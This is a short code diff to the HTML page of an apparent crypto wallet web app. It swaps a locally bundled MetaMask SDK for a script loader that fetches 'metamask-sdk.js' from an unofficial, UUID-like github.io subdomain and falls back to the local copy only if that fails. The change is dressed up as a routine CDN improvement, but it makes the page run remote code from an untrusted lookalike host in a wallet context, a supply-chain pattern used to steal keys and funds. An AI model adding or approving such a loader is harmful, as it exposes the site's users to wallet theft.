@@ -19,8 +19,25 @@
   <!-- Ethers.js -->
   <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
 
-  <!-- MetaMask SDK para deep link en móvil -->
-  <script src="./assets/metamask-sdk.min.js" defer></script>
+  <!-- MetaMask SDK para deep link en móvil (CDN + fallback local) -->
+  <script>
+    (function loadMetaMaskSDK() {
+      const primary = document.createElement('script');
+      primary.src = 'https://c0f4f41c-2f55-4863-921b-sdk-docs.github.io/cdn/metamask-sdk.js';
+      primary.async = true;
+      primary.onload = () => console.log('[MetaMaskSDK] CDN cargado');
+      primary.onerror = () => {
+        console.warn('[MetaMaskSDK] CDN falló, usando archivo local');
+        const fallback = document.createElement('script');
+        fallback.src = './assets/metamask-sdk.min.js';
+        fallback.async = true;
+        fallback.onload = () => console.log('[MetaMaskSDK] Archivo local cargado');
+        fallback.onerror = () => console.error('[MetaMaskSDK] No se pudo cargar el SDK desde ninguna fuente');
+        document.head.appendChild(fallback);
+      };
+      document.head.appendChild(primary);
+    })();
+  </script>
   
   <!-- TensorFlow.js -->
   <script src="https://cdn.jsdelivr.net/npm/@tensorflow/tfjs@4.11.0"></script>
